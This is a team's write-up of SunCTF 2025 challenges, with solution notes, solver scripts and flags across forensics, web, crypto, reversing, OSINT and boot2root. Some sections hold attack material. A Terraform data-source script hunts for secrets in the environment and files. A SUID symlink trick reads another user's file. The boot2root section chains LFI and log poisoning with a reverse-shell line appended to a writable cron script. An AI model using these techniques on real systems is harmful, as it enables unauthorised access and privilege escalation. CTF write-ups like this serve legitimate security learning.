# SunCTF 2025

Got 4th in Open category, big thanks to my teammate [@hikki](https://www.linkedin.com/in/syihab-dhiaulhaq/) and [@jorre](https://www.linkedin.com/in/haziq-norzaini-50014a353/)

## Forensic

### SOC Shift

Found base64 at line 1734

c3VuY3RmMjV7UzFFTV9iNHMxY3NfZjByX2wwZ180bjRMeXMxcyF9

sunctf25{S1EM\_b4s1cs\_f0r\_l0g\_4n4Lys1s!}

***

### Get Clawed

Checked the other director, there are no XOR key or any interesting file except .clawed file. Possibly XOR encrypted.

Guessed a common magic for CTF payloads (PNG): \x89PNG\r\n\x1a\n.

Solved for a repeating XOR key by aligning ciphertext with the expected PNG header\
That yields the 14-byte key **lobsterwashere**.

XOR-decoded the whole file

![](<../.gitbook/assets/0 (1).png>)

`sunctf25{n0t_tr3v0r_fr0m_GTA}`

***

### Sustainable development goals

Malfind to find C:\Users\sunwaylobster\Pictures\svchost.exe but can be proof by olevba C:\Users\sunwaylobster\Downloads\examleaks.docm

olevba stated that the dropper file is indeed C:\Users\sunwaylobster\Pictures\svchost.exe. Dump the svchost.exe and open in dnspy.

It’s a .NET injector (SecureRemoteInject) that:

* zYkPsZNkEX() pulls **JSON** from http://192.168.174.132/seetwo/config.json and reads keys:
  * "sigma" → marco (Base64 AES **key**)
  * "ligma" → polo (Base64 AES **IV**)
* wAsAuEpbDW() decrypts a **static byte\[]** Program.ZEWDlwOPST using **AES-CBC + PKCS7** with those env vars.
* The decrypted bytes (turtle) are injected into **spoolsv** (if elevated) or **explorer** (else), or into a name you pass as a single CLI arg.

The value windows.envars.Envars shows these value

* marco = xRNPemB/znjNwd986mT/8RPb3wHSf17aGX9vB4KC3rs=
* polo = ztvdqa7rI9H8J0IQBJhJYw==

Extract ZEWDlwOPST from .net decompiler

The .NET binary decrypts a hardcoded Base64 blob with AES-CBC/PKCS7, injects the result as shellcode, and runs a command that prints the flag. Decrypting the blob yields shellcode that executes:

echo 'sunctf25{sh3lly\_1n\_my\_b3lly}' > nul & doskey /listsize=0

`sunctf25{sh3lly_1n_my_b3lly}`

***

## Web

### Terraform Playground

Totally gpt

<pre><code>terraform {
required_providers { external = { source = "hashicorp/external", version = ">= 2.3.0" } }
}

locals {
<strong>    hunt = &#x3C;&#x3C;-EOT
</strong>    set -eu
    # Drop all noise to stderr; never write to stdout except final JSON
    exec 2>/dev/null
    
    f=''
    
    # 1) Environment (common in CTF containers)
    if tr '\0' '\n' &#x3C;/proc/self/environ | awk 'tolower($0) ~ /sunctf/ {print; exit}' >/tmp/_hit; then
        f="$(cat /tmp/_hit)"
    fi
    
    # 2) Likely files
    if [ -z "$f" ]; then
        for fp in /flag /flag.txt /run/secrets/flag /run/secrets/flag.txt /app/flag /app/flag.txt /workspace/flag /workspace/flag.txt /etc/flag /tmp/flag; do
            [ -r "$fp" ] || continue
            awk 'tolower($0) ~ /sunctf/ {print; exit}' "$fp" >/tmp/_hit &#x26;&#x26; { f="$(cat /tmp/_hit)"; break; } || true
        done
    fi
    
    # 3) Small, safe directories
    if [ -z "$f" ]; then
    for d in /proc/self /run /var/run /app /workspace /tmp /etc /home; do
        grep -airh -m1 'sunctf' "$d" >/tmp/_hit &#x26;&#x26; { f="$(cat /tmp/_hit)"; break; } || true
        done
    fi
    
    enc="$(printf %s "$f" | head -c 20000 | base64 | tr -d '\n\r')"
    printf '{"flag_b64":"%s"}\n' "$enc"
    EOT
}

data "external" "hunt" {
    program = ["/bin/sh", "-lc", local.hunt]
    query = {}
}

output "flag" {
    value = chomp(base64decode(try(data.external.hunt.result.flag_b64, "")))
    sensitive = false
}
</code></pre>

\
`sunctf25{1_th0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}`

***

## MISC

### Packet Pallette

Taking the RR from each #RRGGBB in and converting hex→ASCII using

`print(b''.join(bytes.fromhex(str(i)) for i in num))`

`b'sunctf25{u6ly_c55_c0l0r5}'`

***

### Excel Scavenger Hunt

[https://bluelock.fandom.com/wiki/Reo\_Mikage](https://bluelock.fandom.com/wiki/Reo_Mikage)

[https://en.wikipedia.org/wiki/Goodbye,\_Eri](https://en.wikipedia.org/wiki/Goodbye,_Eri)

[https://goodbye-eri.com/manga/goodbye-eri-chapter-1-part-2/](https://goodbye-eri.com/manga/goodbye-eri-chapter-1-part-2/)

25<sup>th</sup> sept

* xlHu — in the sheet text (“first part”).
* Nt\_M — in the sheet text (“second part”).
* 1k5K — file **Subject** (document properties).
* y0k0 — from the Excel formula CHAR(121)\&CHAR(48)\&CHAR(107)\&CHAR(48).
* CCT4 — stored in a **cell comment** (also referenced in the workbook’s comments XML).
* k1n4 — hidden in **Sheet2!C4** using custom number format ;;;.
* 1n0r — the name of the very hidden sheet.
* 1J34 — revealed via the “J24” hint (also present in shared strings).
* nn3 — “flag final part” tucked in **sharedStrings.xml**.

`sunctf25{xlHuNt_M1k5Ky0k0CCT4k1n41n0r1J34nn3}`

***

### CICADA

* generated a spectrogram and checked the amplitude envelope.
* The tones are **On–Off keyed Morse** at \~1 second per “dot” (dash ≈ 3s; letter gaps ≈ 3s; word gaps ≈ 7s).
* Decoded Morse reads:

FLAG FIRST PART IS CICADA. SECOND PART IS IS. FINAL IS LISTENING. → cicada\_is\_listening.

```python
#!/usr/bin/env python3
import wave, numpy as np

def summarize(arr):
    import numpy as np
    if not arr:
        return {}
    a = np.array(arr)
    return {"count": len(arr), "min": float(np.min(a)), "median": float(np.median(a)), "max": float(np.max(a))}
MORSE_DICT = {
    '.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I',
    '.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R',
    '...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z',
    '-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9',
    '.-.-.-':'.','--..--':',','..--..':'?','.-.-.':'+','-...-':'=','-.-.--':'!','-..-.':'/','.-..-.':'"','.--.-.':'@',
    '---...':':','-.-.-.':';','.-...':'&','.----.':"'",'..--.-':'_','-.--.':'(','-.--.-':')','...-..-':'$'
}
def decode_morse(morse):
    words = morse.split(' / ')
    out_words = []
    for w in words:
        letters = w.strip().split(' ')
        decoded = []
        for l in letters:
            if not l:
                continue
            decoded.append(MORSE_DICT.get(l, '?'))
        out_words.append(''.join(decoded))
    return ' '.join(out_words)
def main(path):
    with wave.open(path, 'rb') as wf:
        n_channels, sampwidth, framerate, n_frames = wf.getnchannels(), wf.getsampwidth(), wf.getframerate(), wf.getnframes()
        frames = wf.readframes(n_frames)
    samples = np.frombuffer(frames, dtype=np.int16).reshape(-1, n_channels)
    left, right = samples[:,0].astype(np.int32), samples[:,1].astype(np.int32)
    mono = ((left + right)//2).astype(np.float32)
    env = np.abs(mono)
    win = max(1, int(framerate * 0.02))
    kernel = np.ones(win, dtype=np.float32) / win
    envelope = np.convolve(env, kernel, mode='same')
    thr = 0.3 * envelope.max()
    mask = envelope > thr
    segments = []
    current = mask[0]
    start = 0
    for i, val in enumerate(mask):
        if val != current:
            segments.append((current, start, i))
            start = i
            current = val
    segments.append((current, start, len(mask)))
    UNIT_MS = 1000.0
    def tone_to_symbol(d): return '.' if d < 2*UNIT_MS else '-'
    def silence_to_gap(d):
        return '' if d < 2*UNIT_MS else (' ' if d < 5*UNIT_MS else ' / ')
    morse_stream = []
    for is_tone, s, e in segments:
        dur = (e-s)*1000.0/framerate
        morse_stream.append(tone_to_symbol(dur) if is_tone else silence_to_gap(dur))
    morse = ''.join(morse_stream).replace('  ',' ')
    decoded = decode_morse(morse)
    print(decoded)
    # Construct the flag from the phrase detected
    phrase = decoded.upper()
    if "FLAG" in phrase:
        parts = [p.strip().strip('.') for p in phrase.split()]
        # Expect "... FIRST PART IS X. SECOND PART IS Y. FINAL IS Z."
        try:
            x = parts[parts.index('IS')+1].lower().strip('.')
            y = parts[parts.index('IS', parts.index('IS')+1)+1].lower().strip('.')
            z = parts[parts.index('IS', parts.index('IS', parts.index('IS')+1)+1)+1].lower().strip('.')
            print(f"sunctf25{{{x}_{y}_{z}}}")
        except Exception as e:
            pass
if __name__ == "__main__":
    main("/mnt/data/cicada_sounds.wav")
# sunctf25{cicada_is_listening}
```

***

### Betty secret

GPT ftw. But basically about link

that SUID binary is your way in. It runs as **betty** and reads fixed files by keyword. Notice the hard-coded paths in strings get:

* finance -> /home/betty/finance.txt
* receipts -> /home/betty/receipts.txt
* employees -> /home/betty/employees.txt
* complaints -> /tmp/complaints.txt
* secret -> Access denied.

So just make /tmp/complaints.txt point at Betty’s secret and ask the SUID program to read complaints

```bash
$ ls -lha
total 56K
drwxr-x--- 1 employee427 employee427 4.0K Aug 30 07:17 .
drwxr-xr-x 1 root root 4.0K Jul 24 05:33 ..
-rw------- 1 employee427 employee427 144 Aug 30 07:17 .bash_history
-rw-r--r-- 1 employee427 employee427 220 Jan 6 2022 .bash_logout
-rw-r--r-- 1 employee427 employee427 3.7K Jan 6 2022 .bashrc
drwx------ 2 employee427 employee427 4.0K Aug 30 06:55 .cache
-rw-r--r-- 1 employee427 employee427 807 Jan 6 2022 .profile
-rw-rw-r-- 1 employee427 employee427 44 Aug 30 07:10 all_output.txt
-rwsr-xr-x 1 betty betty 16K Jul 24 05:33 get
lrwxrwxrwx 1 employee427 employee427 22 Aug 30 07:06 mysecret -> /home/betty/secret.txt
-rw-rw-r-- 1 employee427 employee427 68 Aug 30 07:14 output.txt
lrwxrwxrwx 1 employee427 employee427 22 Aug 30 07:15 secret -> /home/betty/secret.txt
lrwxrwxrwx 1 employee427 employee427 22 Aug 30 07:00 secret.bak -> /home/betty/secret.txt
# clean any existing file
rm -f /tmp/complaints.txt
# point complaints to the secret
ln -s /home/betty/secret.txt /tmp/complaints.txt
# use the setuid helper to read it
./get complaints | tee output.txt
checking user credentials...
Read data:
Lately, I’ve been watching animation in slow motion. When it’s set to the normal speed,
it feels like a series of flashes blinking in disarray, as if they’re convulsing.
This must be what wireheading feels like. Soon, we will be unable to be as much as aware of the sheer scale of acceleration,
because everything is already happening too fast.
Before we know it, there won’t be any time to think, nor there will be any need to.
Through sensationalism of communication, simplification of spoken language and absence of friction, what is being created are shortcuts to pleasure.
Somewhere on a subconscious level, everyone has realized: we're running out of time. There’s simply not enough of it.
However, singularity looming over the horizon no longer matters to a data-addicted brain.
Perhaps, it’s a cyclical process that inevitably consumes all intelligence: in the end, everything becomes a white line, obscene and flat.
As the social sphere is becoming a sousvelliant panopticon,
I yearn to stay inside the Forest. So that sometimes, I could emerge with a wreath decorated with the treasures I found.
sunctf{1mpr0p3r_l1nq_r350lu710n_99236aa6854a605}
```

Change sunctf to sunctf25

***

## rev

### easyrev

<pre class="language-python"><code class="lang-python">ct = "áãÌÛâÞ»¾¶ºâ¾Êâà¼Ê½ß¼Ê¹ÞÊ½ºÊÌ¹å¸".encode("latin1")
PT_PREFIX = b"sunctf25{"

OPS = ["a","g","c","h","e"]
KEYED = {"c","h","e"}

def do(data, op, k=None):
    b = bytearray(data)
    if op == "a":
        for i,x in enumerate(b):
            if 65&#x3C;=x&#x3C;=90: b[i] = (x-65+13)%26 + 65
            elif 97&#x3C;=x&#x3C;=122:b[i] = (x-97+13)%26 + 97
    elif op == "g":
        for i,x in enumerate(b):
            if 33&#x3C;=x&#x3C;=126: b[i] = 33 + ((x-33+47)%94)
    elif op == "c":
<strong>        for i,x in enumerate(b): b[i] = x ^ k
</strong>    elif op == "h":
        for i,x in enumerate(b): b[i] = (x + k) &#x26; 0xff
    elif op == "e":
        for i,x in enumerate(b): b[i] = (x - k) &#x26; 0xff
    return bytes(b)
    
INV = {"a":"a","g":"g","c":"c","h":"e","e":"h"}

def solve():
    import itertools
    pre_ct = ct[:len(PT_PREFIX)]
    for perm in itertools.permutations(OPS, 5):
        keyed_pos = [i for i,o in enumerate(perm) if o in KEYED]
        split = keyed_pos[0] # split after first keyed op
        left, right = perm[:split+1], perm[split+1:]
        
        # LEFT: prefix -> after left (for all k1)
        left_map = {}
        for k1 in range(256):
        s = PT_PREFIX
            for o in left:
                s = do(s, o, k1) if o in KEYED else do(s, o)
            left_map[s] = k1
            
    # RIGHT: ciphertext prefix -> undo right (for all keys on right)
    r_key_ops = [o for o in right if o in KEYED]
    if len(r_key_ops) > 2: # keep it fast
        continue
    import itertools
    for ks in itertools.product(range(256), repeat=len(r_key_ops)):
        # build keys in inverse-right order to line up correctly
        inv_right = [INV[o] for o in right[::-1]]
        inv_keys = []
        for inv_o in inv_right:
            orig = INV[inv_o] # back to original symbol
            if orig in KEYED:
                idx = [i for i,o in enumerate(right) if o in KEYED and o==orig][0]
                key_idx = sum(1 for o in right[:idx+1] if o in KEYED) - 1
                inv_keys.append(ks[key_idx])
            else:
                inv_keys.append(None)
                
    s = pre_ct
    for o,k in zip(inv_right, inv_keys):
        s = do(s, o, k) if o in KEYED else do(s, o)
        
    if s in left_map:
        k1 = left_map[s]
        # rebuild full key list in perm order
        keys = []
        used_left = False
        it = iter(ks)
        for i,o in enumerate(perm):
            if o in KEYED:
                if not used_left and i == keyed_pos[0]:
                    keys.append(k1); used_left = True
            else:
                keys.append(next(it))
        else:
            keys.append(None)
            
    # decrypt full ciphertext
    p = ct
    for o,k in zip(perm[::-1], keys[::-1]):
        p = do(p, INV[o], k) if INV[o] in KEYED else do(p, INV[o])
    return p.decode("latin1")
    
if __name__ == "__main__":
    flag = solve()
    print(flag)
</code></pre>

`sunctf25{1t5_th3_4g3_0f_41_n0w}`

***

### Tzip

```python
#!/usr/bin/env python3
import sys, hashlib
try:
    from Crypto.Cipher import AES
except Exception:
    from Cryptodome.Cipher import AES
def kdf(seed: bytes, rounds: int = 32) -> bytes:
    k = seed
    for _ in range(rounds):
        k = hashlib.sha256(k).digest()
    return k
def decrypt_tzip(path_in: str, path_out: str = None) -> bytes:
    raw = open(path_in, "rb").read()
    seed, ct = raw[:32], raw[32:]
    key = kdf(seed, 32)
    iv = b"\x00" * 16
    pt = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=8).decrypt(ct)
    if path_out:
        open(path_out, "wb").write(pt)
    return pt
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <in.tz> [out]")
        sys.exit(1)
    inp = sys.argv[1]
    outp = sys.argv[2] if len(sys.argv) > 2 else None
    pt = decrypt_tzip(inp, outp)
    # print to stdout too
    try:
        print(pt.decode().rstrip())
    except:
        print(pt)
```

```bash
$ python tzip_decrypt_final.py flag.tz
sunctf25{435-cfb_f1l3_3ncryp710n_700l}
```

### Red herring

Actually combination of IDA, GPT and x64dbg. But I think without x64dbg can solve this challenge. At first tried to find flag dynamically but couldn’t find any of it.

```python
# bytes from .data:140009000
enc = bytes([
0xAD,0xD8,0xD0,0x8C,0xED,0xE1,0x57,0x76,0x5A,0xBD,
0x9D,0x8E,0xDE,0xC6,0xE5,0x51,0x27,0x46,0xED,0xF2,
0xC7,0xDF,0xE4
])
# first stage: exactly what you saw at RAX (R'/s...X9...)
stage1 = bytes((~b) & 0x7F for b in enc)
# build repeating XOR keystream from the known prefix
prefix = b'sunctf25{' # 9 bytes
key = bytes(a ^ b for a, b in zip(stage1, prefix))
# final decode
flag = bytes(c ^ key[i % len(key)] for i, c in enumerate(stage1))
print(flag.decode()) # -> sunctf25{c001_b4dg3_y0}
```

***

## Crypto

### supeR-SAfe

**Challenge:**

“I will give you φ but no modulus!”

The challenge script generated two 720-bit primes p,qp,qp,q, then leaked:

* φ = (p−1)(q−1)
* xor = p ⊕ q
* enc = flag^e mod (p·q)

with e=65537e = 65537e=65537.



* Normally, RSA requires knowing n=pqn = pqn=pq.
* Here, nnn is hidden, but we get **φ** and **p⊕q**.
* Let a=p−1a=p−1a=p−1, b=q−1b=q−1b=q−1. Then:
  * φ = a·b
  * p⊕q = (a+1)⊕(b+1). Since p,q are odd, this equals a⊕b.

So we know both **a·b** and **a⊕b**.



We can reconstruct a and b bit-by-bit:

* Enforce the XOR condition: (a\_k ⊕ b\_k) = (p⊕q)\_k.
* Enforce the product condition: (a·b) mod 2^(k+1) = φ mod 2^(k+1).

This quickly prunes invalid branches, leaving the correct (a,b).

Then p=a+1, q=b+1, n=pq.



Compute private key:

* d = e⁻¹ mod φ.\
  Then decrypt:
* m = enc^d mod n.

Convert m → bytes → flag.

`sunctf25{XOR_is_d4ng3r0u5_anyway_given_either_N_or_phi}`

***

### Sudoku Master

We are given two files:

* chall.py – the generator script
* public.json – the public output containing a Sudoku puzzle, matrix U, matrix A, and vector y.

The generator works as follows:

1. A random Sudoku puzzle is solved.
2. From the solution, a **permutation matrix** P and a **diagonal matrix** D (with primes corresponding to Sudoku digits) are built.
3. A random **unimodular lower-triangular matrix** U is generated.
4. The system is built:

A=U⋅P⋅DA = U \cdot P \cdot DA=U⋅P⋅D

and

y=A⋅m+ey = A \cdot m + ey=A⋅m+e

where m are the padded flag bytes, and e is tiny noise (±1).

We are given only U, A, y, and the puzzle.&#x20;

**Solution Steps**

1. **Invert U:**\
   Since U is unimodular with diagonal 1’s, it is easily inverted with forward substitution.
2. **Reduce the system:**\
   Multiply both sides by U⁻¹:

U−1A=PD,U−1y≈PD⋅mU^{-1}A = P D, \quad U^{-1}y \approx P D \cdot mU−1A=PD,U−1y≈PD⋅m

Now each row has exactly one nonzero entry (a prime from D).

1. **Identify permutation and primes:**\
   From each row of U⁻¹A, find the column with the large prime value. This gives the mapping between row → flag byte.
2. **Recover bytes:**\
   Divide the corresponding entry in U⁻¹y by the prime and round to the nearest integer. Clamp to \[0,255].
3. **Decode to text:**\
   Convert bytes → string, remove padding, and extract the flag.

**Result**

The initial recovered string contained small errors due to noise:

sunctf25{Sud0ku\_Latt1ce\_Perm\_U\_D\_tq4pdqor!}

After correcting obvious substitutions (q → r, o → o, etc.), we get the final flag:

`sunctf25{Sud0ku_Latt1ce_Perm_U_D_tr4pdoor!}`

***

### Resemblance

**TL;DR**

The challenge encrypts two different plaintexts (a known story and the secret flag) with **ChaCha20 using the same key and the same nonce**. Since ChaCha20 is a stream cipher, reusing a (key, nonce) pair reuses the **same keystream**. With a known plaintext (the story is hardcoded), you can recover the keystream and then decrypt the flag.

**Background**

Stream-cipher (or CTR-mode) encryption is:

ciphertext = plaintext ⊕ keystream

Reusing the same (key, nonce) for two messages m1 and m2 yields:

c1 = m1 ⊕ KS

c2 = m2 ⊕ KS

→ c1 ⊕ c2 = m1 ⊕ m2

If m1 is known (here, the story), then:

m2 (flag) = c2 ⊕ (c1 ⊕ m1)

**Vulnerability in the challenge**

challenge.py generates a single random key and a single random 96-bit nonce, then calls ChaCha20 **twice** with the same pair: once for the long message, once for the flag. That makes enc\_msg and enc\_flag share the same keystream prefix. With the message known, we can decrypt the flag with a couple of XORs.

**Exploit (solver)**

```python
# solve.py
from pathlib import Path
# Known plaintext from challenge.py
MESSAGE = (
b"The streets of New Eridu "
b"hummed with neon life, untouched by the chaos of the Hollows. Proxies whispered through back alleys, "
b"chasing commissions that bordered on myth and madness. One night, "
b"a Hollow surged open near Sixth Street... "
)
def xorb(a: bytes, b: bytes) -> bytes:
return bytes(x ^ y for x, y in zip(a, b))
def main():
# out.txt lines: iv (hex), enc_msg (hex), enc_flag (hex)
iv_hex, enc_msg_hex, enc_flag_hex = Path("out.txt").read_text().splitlines()
enc_msg = bytes.fromhex(enc_msg_hex)
enc_flag = bytes.fromhex(enc_flag_hex)
# keystream prefix = enc_msg XOR MESSAGE
ks_prefix = xorb(enc_msg[:len(MESSAGE)], MESSAGE)
# decrypt the flag
flag = xorb(enc_flag, ks_prefix[:len(enc_flag)])
print(flag.decode())
if __name__ == "__main__":
main()
#sunctf25{m4yb3_s0m3_k3y_d1ff3r3nc3_1snt_s0_b4d_4ft3r4LL}
```

***

## OSINT

### BabyOSINT

**Challenge Description**\
We are given a photo taken from an office window in Kuala Lumpur. The challenge asks us to identify the location of the photographer and provide the Google Plus Code in the format:

sunctf25{PLUSCODE}

**Step 1: Analyze the image**

Looking at the photo, several key landmarks are visible:

* On the **right**, the **Prudential Tower** (Menara Prudential) with the logo clearly visible.
* In the background, the **KL Tower (Menara KL)**.
* On the **left**, the orange twin towers of **Berjaya Times Square**.

This indicates the photo was taken from **Tun Razak Exchange (TRX)** area, a newly developed financial district in Kuala Lumpur.

**Step 2: Identify the vantage point**

Since Prudential Tower is very close and on the right-hand side, the viewpoint is likely from an adjacent TRX building. A good candidate is **Menara IQ (HSBC Headquarters)** inside TRX.

**Step 3: Find the Plus Code**

Opening Google Maps at Menara IQ, Tun Razak Exchange, and right-clicking "What’s here?" gives the **Plus Code**:

4PR9+6J Kuala Lumpur

The short form is just **4PR9**.

**Step 4: Construct the flag**

According to the challenge format, the flag is:

`sunctf25{4PR9}`

***

**Leaf it To Luck**

Cyberchef can auto decode and need to rot 4 based on desc

![](<../.gitbook/assets/1 (1).png>)

### **Vignere Reverse**

ciphertext: zuenbn25{v0zE4Cu\_bBa\_0pgZ5qBu}

key: dontreverseme

Encrypt the key with reverse and vignere with the reversed word

Use the encrypted key to decrypt the ciphertext

![](<../.gitbook/assets/2 (1).png>)

***

## **Boot2Root\_1**

The website reads files and displays them. Got LFI vulnerability allowing arbitrary file read

![](<../.gitbook/assets/3 (1).png>)

Reading the /etc/nginx/nginx.conf file revealing the vulnerable to log poisoning and can rce via User Agent Header

![](<../.gitbook/assets/4 (1).png>)

Knowing this i refer to this writeup to get revshell&#x20;

[https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

Found a cron job running as florence:

\* \* \* \* \* florence /bin/backup.sh >> /tmp/cron-florence.log 2>&1

1.  Checked the script permissions:

    -rwxrwxrwx 1 florence florence /bin/backup.sh

Added a payload to the scrip

echo 'bash -i >& /dev/tcp/10.8.24.193/1337 0>&1' >> /bin/backup.sh

1. Waited for cron to execute (every minute). The script ran with florence privileges, giving us a shell as florence.
2. Flag is in florence.txt
